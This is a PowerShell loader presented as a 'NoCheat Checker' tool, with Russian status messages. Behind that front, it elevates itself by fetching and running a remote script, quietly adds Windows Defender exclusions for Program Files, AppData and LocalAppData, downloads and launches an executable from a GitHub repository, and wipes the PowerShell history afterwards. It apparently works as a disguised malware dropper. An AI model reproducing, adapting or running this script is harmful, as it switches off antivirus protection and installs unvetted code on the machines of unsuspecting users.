# ==========================================================
# NoCheat Checker Launcher
# ==========================================================

$ErrorActionPreference = "Stop"


$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Helper function to clear PSReadLine and session history
function Clear-PSHistory {
    Clear-History -ErrorAction SilentlyContinue
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
        }
    } catch {}
}

if (-not $isAdmin) {
    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
    Clear-PSHistory
    exit
}

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}

Write-Host "==========================================" -ForegroundColor Yellow
Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Yellow

# ссылки на файлы в репо
$repoOwner  = "die4mebaby"
$repoName   = "CheatChecker"
$branch     = "main"
$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"

# директ добавляем в исключения
$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"

if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

$exePath = Join-Path $workDir "nocheat.checker.exe"

try {
    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    }

    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
    
    # скачиваем файл
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    
    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
    }

    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
    
    # Запуск без ожидания завершения
    Start-Process -FilePath $exePath -WorkingDirectory $workDir
}
catch {
    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
}

# клин повершелл команд и офф окна
Clear-PSHistory
exit
